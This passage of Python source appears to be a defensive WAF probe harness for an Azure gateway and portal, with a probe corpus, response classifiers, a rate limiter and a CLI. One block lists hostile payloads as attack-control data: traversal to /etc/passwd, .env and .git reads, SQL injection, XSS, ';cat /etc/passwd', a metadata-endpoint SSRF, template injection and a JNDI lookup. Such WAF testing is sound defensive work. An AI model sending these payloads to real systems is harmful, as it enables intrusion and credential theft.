            if route.constraint.get("kind") == "realtimeCreate" or "live-control" in route.operation:
                value = _json_variants(route, "Synthetic SDP attribute")[0][1]
                add(route, "sdp", "sdp", "sdp", value)
            elif route.path in {"/models/azure-speech/v1/recognize", "/tools/documents/v1/analyze"}:
                body, mime = _raw_guard_body(route, "Synthetic typed media")
                add(route, "raw-media", "media-binary", "raw-body:data", body=body, mime=mime)
    return cases


def exclusion_coverage(cases: Iterable[Probe], manifest: dict) -> list[dict]:
    """Project actual fixture fields, never trust their payload_field labels.

    JSON array indexes are elided as a *synthetic candidate* for Azure argument
    flattening. This is offline field-presence coverage, not proof that a WAF
    parser evaluated a rule. Actual extraction/403 attribution needs WAF logs.
    No field values or dynamic names are returned in the coverage records.
    """
    def json_names(value, prefix=""):
        if isinstance(value, dict):
            for key, child in value.items():
                name = prefix + "." + key if prefix else key
                yield from json_names(child, name)
        elif isinstance(value, list):
            for child in value:
                yield from json_names(child, prefix)
        else:
            yield prefix

    observed = []
    for case in cases:
        if case.intent != "compatibility":
            continue
        names = []
        headers = dict(case.headers)
        mime = next((value for name, value in case.headers if name.casefold() == "content-type"), "")
        if mime.split(";", 1)[0].casefold() == "application/json":
            try:
                names.extend(("json", name) for name in json_names(json.loads(case.body or b"")))
            except (ValueError, UnicodeError):
                pass  # A fake size blob does not cover any JSON selector.
        elif mime.split(";", 1)[0].casefold() == "multipart/form-data":
            message = BytesParser(policy=email_policy.default).parsebytes(
                ("Content-Type: " + mime + "\r\nMIME-Version: 1.0\r\n\r\n").encode() + (case.body or b""))
            if message.is_multipart():
                for part in message.iter_parts():
                    name = part.get_param("name", header="content-disposition")
                    if isinstance(name, str) and part.get_filename() is None:
                        names.append(("multipart", name))
                        try:
                            names.extend(("multipart-json-projection", child) for child in json_names(json.loads(part.get_payload(decode=True)), name))
                        except (ValueError, UnicodeError, TypeError):
                            pass
        cookies = SimpleCookie()
        try:
            cookies.load(next((value for name, value in case.headers if name.casefold() == "cookie"), ""))
        except CookieError:
            cookies = SimpleCookie()
        observed.append((case, names, {name.casefold() for name in headers}, set(cookies)))
    result = []
    for profile in manifest["profiles"]:
        for exclusion in profile["exclusions"]:
            variable, operator, selector = (exclusion[key] for key in ("matchVariable", "selectorMatchOperator", "selector"))
            matches, channels, data_types = [], set(), set()
            for case, names, headers, cookies in observed:
                if case.target != profile["scope"] or not any(fnmatchcase(case.path.casefold(), path.casefold()) for path in profile["paths"]):
                    continue
                if variable == "RequestHeaderValues":
                    candidate = [("header", name) for name in headers]
                    selected = selector.casefold()
                elif variable in {"RequestArgValues", "RequestArgKeys"}:
                    candidate, selected = names, selector
                elif variable == "RequestCookieValues":
                    candidate, selected = [("cookie", name) for name in cookies], selector
                else:
                    continue
                if operator == "Equals":
                    found = {channel for channel, name in candidate if name == selected}
                else:
                    found = {channel for channel, name in candidate if operator == "StartsWith" and name.startswith(selected)}
                if found:
                    matches.append(case.case_id)
                    channels.update(found)
                    data_types.add(case.data_type or "legacy-unclassified")
            result.append({"profile": profile["name"], "match_variable": variable, "operator": operator,
                "selector": selector, "case_ids": sorted(set(matches)), "channels": sorted(channels), "data_types": sorted(data_types),
                "offline_field_present": bool(matches), "waf_extraction_verified": False})
    return result


def build_corpus(routes: list[Route] | None = None, root: Path = ROOT) -> list[Probe]:
    """Build deterministic, finite cases; synthetic attacks always remain anonymous."""
    routes = load_routes(root) if routes is None else routes
    cases = []
    values = payloads()
    for route in routes:
        body, mime = _body(route, "Synthetic WAF baseline")
        baseline_body = body
        headers = [("Content-Type", mime)] if mime else []
        if route.websocket:
            headers += [("Connection", "Upgrade"), ("Upgrade", "websocket"),
                        ("Sec-WebSocket-Version", "13"), ("Sec-WebSocket-Key", "d2FmLXByb2JlLWZpeHR1cmU=")]
        cases.append(_probe(route, "baseline", "baseline", body=body, headers=headers))
        if body is not None:
            for label, text in values:
                if route.body_format == "json":
                    for payload_field, value in _json_variants(route, text):
                        field_slug = re.sub(r"[^a-z0-9]+", "-", payload_field.lower()).strip("-") + "-" + hashlib.sha256(payload_field.encode()).hexdigest()[:4]
                        cases.append(_probe(route, label + "-" + field_slug, "content-" + label,
                            body=json_bytes(value), headers=[("Content-Type", "application/json")], payload_field=payload_field))
                else:
                    body, mime = _body(route, text)
                    cases.append(_probe(route, label, "content-" + label, body=body, headers=[("Content-Type", mime)]))
            if route.body_format == "json":
                for label, value in (
                    ("json-array", [{"text": text, "index": i} for i, (_, text) in enumerate(values[:20])]),
                    ("json-nested", {"items": [{"metadata": {"filter": values[3][1], "template": values[18][1]}}] * 8}),
                    ("json-null-bool-number", {"items": [None, True, False, -1, 1.2e30, 0, "", [], {}]}),
                    ("json-repeated-values", {"input": [values[23][1]] * 8, "model": INVALID_MODEL}),
                ):
                    cases.append(_probe(route, label, label, body=json_bytes(value), headers=[("Content-Type", "application/json")]))
                cases.append(_probe(route, "json-charset", "content-type", body=json_bytes({"input": values[2][1]}), headers=[("Content-Type", "application/json; charset=utf-8")]))
            if route.target == "portal" and route.path == "/api/models/speech":
                speech_input = {"modelId": "azure-speech-tts", "text": "Synthetic speech input", "voice": "ja-JP-NanamiNeural", "rate": "0%", "apiKeyId": "portal-00000000-0000-4000-8000-000000000001"}
                cases.append(_probe(route, "speech-multipart", "multipart-audio", body=_multipart("probe", portal_input=speech_input), headers=[("Content-Type", "multipart/form-data; boundary=waf-probe-fixed-boundary")], payload_field="input.text"))
        # Small URL/header matrix on every route, including GET routes and all Portal pages.
        for label, text in (values[0], values[3], values[7], values[15], values[21], values[24]):
            cases.append(_probe(route, "query-" + label, "query-" + label,
                body=baseline_body,
                headers=headers, query=[("integration_metadata", text)]))
        for label, value in (("opaque", values[24][1]), ("punctuation", values[23][1]), ("unicode", quote(values[2][1]))):
            cases.append(_probe(route, "header-" + label, "header-" + label,
                headers=headers + [("X-Integration-Metadata", value)], body=_body(route, "Synthetic header probe")[0]))
        cases.append(_probe(route, "query-duplicate", "query-duplicate", headers=headers,
            body=_body(route, "Synthetic duplicate query probe")[0], query=[("tag", "one"), ("tag", "two"), ("empty", "")]))
        if route.websocket:
            for name, value in (("Sec-WebSocket-Protocol", "realtime"), ("Sec-WebSocket-Protocol", "realtime, openai-insecure-api-key.synthetic-not-a-key")):
                cases.append(_probe(route, "ws-" + hashlib.sha256(value.encode()).hexdigest()[:6], "websocket-upgrade", headers=headers + [(name, value)]))
        # A supplied key is restricted to invalid-model validation, never normal inference.
        if (route.method, route.path) in CANARY_ROUTES:
            for label, text in values:
                for payload_field, value in _json_variants(route, text, canary=True):
                    field_slug = re.sub(r"[^a-z0-9]+", "-", payload_field.lower()).strip("-") + "-" + hashlib.sha256(payload_field.encode()).hexdigest()[:4]
                    cases.append(_probe(route, "authenticated-canary-" + label + "-" + field_slug, "authenticated-canary-" + label,
                        body=json_bytes(value), headers=[("Content-Type", "application/json")], auth_mode="invalid-model-canary", payload_field=payload_field))

    # Content type and size boundaries are explicit application-validation tests.
    for route in routes:
        if route.target != "gateway" or route.method != "POST":
            continue
        maximum = route.constraint.get("maxRequestBytes")
        if isinstance(maximum, int) and maximum <= 4 * 1024 * 1024:
            for delta in (-1, 0, 1):
                size = maximum + delta
                cases.append(_probe(route, f"size-{size}", "size-boundary", intent="validation",
                    body=b"p" * size, headers=[("Content-Type", (route.content_types or ("application/json",))[0])]))
        if route.body_format == "binary":
            for mime in dict.fromkeys(("application/pdf", "image/png", "image/jpeg", "image/tiff", "image/bmp", "audio/wav", "application/octet-stream", *route.content_types)):
                data = _binary_fixture(mime)
                cases.append(_probe(route, "mime-" + mime.replace("/", "-"), "binary-mime", intent="compatibility" if mime in route.content_types else "validation", body=data, headers=[("Content-Type", mime)]))
            for size in (65535, 65536, 65537, 131071, 131072, 131073):
                cases.append(_probe(route, f"inspect-boundary-{size}", "inspection-boundary", intent="validation",
                    body=b"p" * size, headers=[("Content-Type", (route.content_types or ("application/octet-stream",))[0])]))

    document_mimes = next((route.content_types for route in routes if route.constraint.get("kind") == "documentAnalysis"), ())
    for route in routes:
        if route.target == "portal" and route.path == "/api/tools/documents" and route.method == "POST":
            portal_input = {"model": "prebuilt-read", "apiKeyId": "portal-00000000-0000-4000-8000-000000000001"}
            for mime in document_mimes:
                cases.append(_probe(route, "multipart-mime-" + mime.replace("/", "-"), "multipart-mime",
                    body=_multipart("Synthetic WAF media boundary", portal_input=portal_input, document=True, file_mime=mime),
                    headers=[("Content-Type", "multipart/form-data; boundary=waf-probe-fixed-boundary")], payload_field="file"))
    cases.extend(boundary_controls(routes))

    # None of these paths invokes a published state-changing route. Targets and
    # callback destinations use reserved .invalid names; commands are inert text.
    attacks = (
        ("traversal", "/waf-probe/../../etc/passwd", ()),
        ("encoded-traversal", "/waf-probe/%2e%2e/%2e%2e/etc/passwd", ()),
        ("double-encoded-traversal", "/waf-probe/%252e%252e%252fetc/passwd", ()),
        ("git-config", "/.git/config", ()),
        ("env-file", "/.env", ()),
        ("php-admin", "/phpmyadmin/index.php", ()),
        ("cgi-path", "/cgi-bin/waf-probe.cgi", ()),
        ("sqli", "/waf-probe/nonexistent", (("id", "1' OR '1'='1' UNION SELECT NULL--"),)),
        ("xss", "/waf-probe/nonexistent", (("search", '<script>alert("synthetic-waf-probe")</script>'),)),
        ("rce", "/waf-probe/nonexistent", (("cmd", ";cat /etc/passwd"),)),
        ("lfi", "/waf-probe/nonexistent", (("file", "../../../../etc/passwd"),)),
        ("ssrf", "/waf-probe/nonexistent", (("url", "http://169.254.169.254/metadata/instance"),)),
        ("template-injection", "/waf-probe/nonexistent", (("template", "{{7*7}}${7*7}"),)),
        ("jndi", "/waf-probe/nonexistent", (("q", "${jndi:ldap://waf-probe.invalid/synthetic}"),)),
    )
    for target in ("gateway", "portal"):
        for label, path, query in attacks:
            route = Route(target, "GET", path, "attack-control", "synthetic attack control", "none")
            cases.append(_probe(route, label, "attack-" + label, intent="attack-control", query=query))
    cases.extend(extended_content(routes))
    cases.extend(adversarial_content(routes))
    cases.extend(decision_question_keys(routes))
    cases.extend(typed_data_probes(routes))
    ids = [case.case_id for case in cases]
    if len(ids) != len(set(ids)):
        raise ValueError("duplicate case IDs")
    return cases


def metadata(case: Probe) -> dict:
    """Return an allowlisted record; never serialize the Probe dataclass."""
    return {"case_id": case.case_id, "target": case.target, "method": case.method,
        "path": case.path, "category": case.category, "intent": case.intent,
        "source": case.source, "auth_mode": case.auth_mode,
        "payload_field": case.payload_field,
        "data_type": case.data_type,
        "request_bytes": len(case.body or b""), "query_names": [name for name, _ in case.query],
        "header_names": [name for name, _ in case.headers]}


def classify_response(status: int, headers: dict, body: bytes, *, auth_mode: str = "anonymous", intent: str = "compatibility") -> dict:
    """Keep ambiguous 403s separate; status alone cannot identify WAF blocking."""
    headers = {key.lower(): value for key, value in headers.items()}
    lower = body[:MAX_RESPONSE_BYTES].lower()
    speech_markup_rejected = False
    if status == 400:
        try:
            envelope = json.loads(body[:MAX_RESPONSE_BYTES])
            speech_markup_rejected = isinstance(envelope, dict) and isinstance(envelope.get('error'), dict) and envelope['error'].get('code') == 'InvalidSpeechMarkup'
        except (ValueError, UnicodeError):
            pass
    waf_marker = (b"microsoft-azure-application-gateway" in lower and
                  (b"403 forbidden" in lower or b"request is blocked" in lower))
    if status == 403 and waf_marker:
        classification, evidence = "waf_block", "appgw-403-body-marker"
    elif 300 <= status < 400:
        classification, evidence = "redirect_not_followed", "http-status"
    elif status in {401, 403}:
        app_marker = any(name in headers for name in ("apim-request-id", "x-apim-request-id", "www-authenticate"))
        if status == 401 or app_marker:
            classification, evidence = "application_rejected", "application-auth-status-or-header"
        else:
            classification, evidence = "forbidden_unattributed", "requires-appgw-log-correlation"
    elif speech_markup_rejected:
        classification, evidence = 'application_validation_or_route_response', 'apim-ssml-dtd-rejection'
    elif status in {400, 404, 405, 406, 409, 415, 422}:
        classification, evidence = "application_validation_or_route_response", "http-status-requires-log-correlation"
    elif status == 429:
        classification, evidence = "rate_limited", "http-status"
    elif status >= 500:
        classification, evidence = "server_error", "http-status"
    else:
        classification, evidence = "response_received", "http-status"
    if auth_mode == "invalid-model-canary" and 200 <= status < 300:
        classification, evidence = "canary_unexpected_success", "invalid-model-was-not-rejected"
    return {"classification": classification, "evidence": evidence,
            "functional_success": False,
            "attack_block_evidence": intent in {"attack-control", "attack_control"} and classification == "waf_block"}


class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, request, file_pointer, code, message, headers, new_url):
        return None


class RateLimiter:
    """Bound aggregate rate across all workers, not just concurrent requests."""
    def __init__(self, per_second: float):
        self.interval = 1.0 / per_second
        self.next_time = 0.0
        self.lock = threading.Lock()

    def wait(self):
        with self.lock:
            now = time.monotonic()
            delay = max(0.0, self.next_time - now)
            self.next_time = max(now, self.next_time) + self.interval
        if delay:
            time.sleep(delay)


def validate_base_url(value: str) -> str:
    parsed = urlsplit(value)
    if parsed.scheme != "https" or not parsed.hostname or parsed.username or parsed.password or parsed.query or parsed.fragment or parsed.path not in {"", "/"}:
        raise ValueError("base URLs must be HTTPS origins without credentials, path, query or fragment")
    return value.rstrip("/")


def probe_user_agent(correlation: str) -> str:
    if len(correlation) > 56 or not re.fullmatch(r"[A-Za-z0-9]+", correlation):
        raise ValueError("correlation must be a bounded alphanumeric synthetic identifier")
    return "egakumi-waf-probe/1.0 " + correlation


def probe_correlation(run_id: str, case_id: str) -> str:
    """Use decimal identifiers so synthetic hex fragments cannot name scanners."""
    run = int.from_bytes(hashlib.sha256(run_id.encode()).digest()[:8], "big")
    case = int.from_bytes(hashlib.sha256(case_id.encode()).digest()[:6], "big")
    return f"{run:020d}{case:015d}"


def request_url(base: str, case: Probe) -> str:
    split = urlsplit(base + case.path)
    query = parse_qsl(split.query, keep_blank_values=True) + list(case.query)
    return urlunsplit((split.scheme, split.netloc, split.path, urlencode(query), ""))


def _curl_response(url: str, method: str, headers: dict, data: bytes | None, timeout: float) -> tuple[int, dict, bytes]:
    """Use the local curl trust store without exposing secrets in process arguments.

    On Windows, the installed curl.exe normally uses Schannel. Header/request/
    response files live only in a temporary private directory and are deleted on
    every exit path. No response content is copied into the report.
    """
    with tempfile.TemporaryDirectory(prefix="egakumi-waf-") as directory:
        temporary = Path(directory)
        temporary.chmod(0o700)
        header_file = temporary / "request-headers"
        header_file.write_text("".join(f"{name}: {value}\n" for name, value in headers.items()), encoding="utf-8")
        header_file.chmod(0o600)
        response_file, response_headers_file = temporary / "response", temporary / "response-headers"
        arguments = ["curl.exe" if __import__("os").name == "nt" else "curl", "-q", "--silent", "--show-error", "--path-as-is",
            "--proto", "=https", "--max-redirs", "0", "--max-time", str(timeout),
            "--request", method, "--header", "@" + str(header_file),
            "--dump-header", str(response_headers_file), "--output", str(response_file), "--write-out", "%{http_code}"]
        if data is not None:
            body_file = temporary / "request-body"
            body_file.write_bytes(data)
            body_file.chmod(0o600)
            arguments.extend(["--data-binary", "@" + str(body_file)])
        arguments.extend(["--url", url])
        completed = subprocess.run(arguments, capture_output=True, timeout=timeout + 5, check=False, shell=False)
        if completed.returncode:
            raise OSError("curl transport failed")
        status = int(completed.stdout.decode("ascii").strip())
        parsed_headers = {}
        for line in response_headers_file.read_text(encoding="iso-8859-1").splitlines():
            if line.startswith("HTTP/"):
                parsed_headers = {}  # Discard proxy CONNECT/interim response headers.
            elif ":" in line:
                name, value = line.split(":", 1)
                parsed_headers[name.strip()] = value.strip()
        with response_file.open("rb") as stream:
            body = stream.read(MAX_RESPONSE_BYTES)
        return status, parsed_headers, body


def run_probe(case: Probe, base: str, run_id: str, timeout: float, limiter: RateLimiter, key: str | None = None, transport: str = "urllib") -> dict:
    record = metadata(case)
    correlation = probe_correlation(run_id, case.case_id)
    record["correlation"] = correlation
    if case.auth_mode == "invalid-model-canary" and not key:
        return {**record, "classification": "skipped_key_required", "functional_success": False}
    headers = {"Accept": "application/json, text/html;q=0.5",
        **{name: value for name, value in case.headers if name.casefold() != "user-agent"},
        "User-Agent": probe_user_agent(correlation)}
    if case.auth_mode == "invalid-model-canary":
        if case.target != "gateway" or (case.method, case.path) not in CANARY_ROUTES or case.intent != "compatibility" or json.loads(case.body or b"{} ").get("model") != INVALID_MODEL:
            raise ValueError("credential canary safety boundary failed")
        headers["api-key"] = key
    url = request_url(base, case)
    limiter.wait()
    record["request_started_at"] = datetime.now(timezone.utc).isoformat()
    start = time.monotonic()
    try:
        if transport == "curl":
            status, response_headers, body = _curl_response(url, case.method, headers, case.body, timeout)
        else:
            opener = build_opener(NoRedirect(), HTTPSHandler(context=ssl.create_default_context()))
            request = Request(url, data=case.body, headers=headers, method=case.method)
            try:
                response = opener.open(request, timeout=timeout)
            except HTTPError as error:
                response = error
            with response:
                status = response.code
                response_headers = dict(response.headers.items())
                # A single bounded network read avoids an unbounded streaming body.
                body = response.read1(MAX_RESPONSE_BYTES) if hasattr(response, "read1") else response.read(MAX_RESPONSE_BYTES)
        result = classify_response(status, response_headers, body, auth_mode=case.auth_mode, intent=case.intent)
        return {**record, "status": status, "elapsed_ms": round((time.monotonic() - start) * 1000),
                "response_bytes_sampled": len(body), **result}
    except (URLError, TimeoutError, OSError, ValueError, HTTPException, subprocess.TimeoutExpired) as error:
        # Exception strings may embed URLs, payload values or credentials.
        return {**record, "classification": "transport_error", "error_type": type(error).__name__,
                "elapsed_ms": round((time.monotonic() - start) * 1000), "functional_success": False}


def _write(path: Path, report: dict):
    private_write(path, json.dumps(report, ensure_ascii=False, indent=2) + "\n")


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--gateway-base-url")
    parser.add_argument("--portal-base-url")
    parser.add_argument("--output", type=Path)
    parser.add_argument("--phase", default="initial", help="Report label, for example before/after.")
    parser.add_argument("--case-filter", default="", help="Regex matched against case ID, category, intent and route.")
    parser.add_argument("--key-file", type=Path, help="Optional raw API key; used only for invalid-model canaries.")
    parser.add_argument("--transport", choices=("urllib", "curl"), default="urllib", help="curl uses the local TLS backend (Schannel on Windows); certificate verification stays enabled.")
    parser.add_argument("--list", action="store_true", help="Print metadata only, without any network traffic.")
    parser.add_argument("--dry-run", action="store_true", help="Write a metadata-only plan without network traffic.")
    parser.add_argument("--raw-body-guards-only", action="store_true", help="Use the separate raw SSML/WAV/PDF traversal boundary corpus.")
    parser.add_argument("--jndi-fields-only", action="store_true", help="Use the standalone anonymous JNDI data-field/control corpus.")
    parser.add_argument("--ai-coding-only", action="store_true", help="Use the bounded anonymous Responses/Chat coding-content and exclusion-control corpus.")
    parser.add_argument("--image-prompts-only", action="store_true", help="Use the bounded anonymous image generation/edit prompt, media and control corpus.")
    parser.add_argument("--workers", type=int, default=2, choices=(1, 2, 3, 4))
    parser.add_argument("--requests-per-second", type=float, default=2.0, help="Aggregate rate, > 0 and <= 4 (default 2).")
    parser.add_argument("--timeout", type=float, default=20.0, help="Per-request socket timeout, 1 to 60 seconds.")
    args = parser.parse_args(argv)
    if not 0 < args.requests_per_second <= 4 or not 1 <= args.timeout <= 60:
        parser.error("rate must be > 0 and <= 4; timeout must be 1 to 60")
    if sum((args.raw_body_guards_only, args.jndi_fields_only, args.ai_coding_only, args.image_prompts_only)) > 1:
        parser.error("select only one standalone corpus")
    try:
        pattern = re.compile(args.case_filter)
        corpus = image_prompt_probes(load_routes()) if args.image_prompts_only else ai_coding_probes(load_routes()) if args.ai_coding_only else jndi_field_probes(load_routes()) if args.jndi_fields_only else raw_body_guard_controls(load_routes()) if args.raw_body_guards_only else build_corpus()
        cases = [case for case in corpus if pattern.search(" ".join((case.case_id, case.category, case.intent, case.path)))]
        bases = {name: validate_base_url(value) for name, value in (("gateway", args.gateway_base_url), ("portal", args.portal_base_url)) if value}
    except (ValueError, re.error) as error:
        parser.error(str(error))
    if bases:
        cases = [case for case in cases if case.target in bases]
    if not cases:
        parser.error("no cases selected")
    if not (args.list or args.dry_run) and (not bases or not args.output):
        parser.error("live probes require at least one base URL and --output")
    if args.output:
        try:
            args.output = private_parent(args.output)
        except (ValueError, OSError):
            parser.error("output requires a protected runtime destination; no probes were sent")
    run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ") + "-" + hashlib.sha256(str(time.time_ns()).encode()).hexdigest()[:6]
    report = {"schema_version": 1, "run_id": run_id, "phase": args.phase,
        "started_at": datetime.now(timezone.utc).isoformat(), "dry_run": args.list or args.dry_run,
        "limitations": ["Finite synthetic corpus; not exhaustive.", "Anonymous application rejections demonstrate WAF transit, not feature success.",
            "403 attribution and matched rules require AppGW firewall log correlation.", "WebSocket handshake only; no frame or authenticated browser workflow coverage.",
            "Synthetic media signatures/containers test the WAF boundary, not downstream document/audio decoding.",
            "Same-name query validation probes measure whether Values exclusions also cover query arguments; they do not approve those application inputs."],
        "selected_case_count": len(cases)}
    if args.list or args.dry_run:
        report["results"] = [metadata(case) for case in cases]
        if args.output:
            _write(args.output, report)
        if args.list:
            for case in cases:
                print(json.dumps(metadata(case), ensure_ascii=False))
        print(json.dumps({"selected": len(cases), "network_requests": 0, "output_written": bool(args.output)}))
        return 0
    key = None
    if args.key_file:
        try:
            key = args.key_file.read_text(encoding="utf-8").strip()
        except OSError:
            parser.error("could not read key file")
        if not key or any(character in key for character in "\r\n\x00"):
            parser.error("key file must contain a single non-empty key")
    report["workers"] = args.workers
    report["transport"] = args.transport
    report["requests_per_second"] = args.requests_per_second
    limiter = RateLimiter(args.requests_per_second)
    report["results"] = []
    # Flush after each bounded batch, retaining useful evidence on interruption.
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        for offset in range(0, len(cases), 32):
            batch = cases[offset:offset + 32]
            futures = [pool.submit(run_probe, case, bases[case.target], run_id, args.timeout, limiter, key, args.transport) for case in batch]
            report["results"].extend(future.result() for future in futures)
            report["counts"] = dict(Counter(result["classification"] for result in report["results"]))
            _write(args.output, report)
            print(json.dumps({"completed": len(report["results"]), "selected": len(cases), "counts": report["counts"]}), flush=True)
    report["completed_at"] = datetime.now(timezone.utc).isoformat()
    _write(args.output, report)
    return 2 if report["counts"].get("transport_error") or report["counts"].get("canary_unexpected_success") else 0


if __name__ == "__main__":
    raise SystemExit(main())
